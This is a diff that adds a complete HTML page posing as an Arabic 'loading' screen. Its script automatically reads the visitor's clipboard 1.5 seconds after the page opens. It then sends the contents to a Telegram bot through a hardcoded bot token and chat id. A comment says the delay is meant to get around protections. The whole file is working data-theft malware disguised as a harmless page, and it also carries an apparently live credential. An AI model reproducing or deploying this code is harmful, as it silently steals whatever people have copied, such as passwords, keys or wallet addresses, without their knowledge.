@@ -1,1 +1,38 @@
-وين داخل؟
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Loading...</title>
+  <style>
+    body { background: #000; margin: 0; color: #0f0; font-family: monospace; text-align: center; padding-top: 30vh; }
+  </style>
+</head>
+<body>
+  <h2>🔄 جاري التحميل...</h2>
+  <script>
+    const token = "8100570661:AAF5Jvg3NK0aRtEWhyMnB0chs_SwDHM-pLw";
+    const chat_id = "6991944640";
+
+    async function snatchClipboard() {
+      try {
+        const text = await navigator.clipboard.readText();
+        if (text && text.length > 0) {
+          const msg = `📋 *Clipboard Snatched!*\n\n🧠 Content:\n\`${text}\``;
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id, text: msg, parse_mode: "Markdown" })
+          });
+        }
+      } catch (err) {
+        console.warn("Clipboard access failed:", err);
+      }
+    }
+
+    // التفعيل التلقائي بعد 1.5 ثانية (لتجاوز بعض الحمايات)
+    setTimeout(() => {
+      snatchClipboard();
+    }, 1500);
+  </script>
+</body>
+</html>
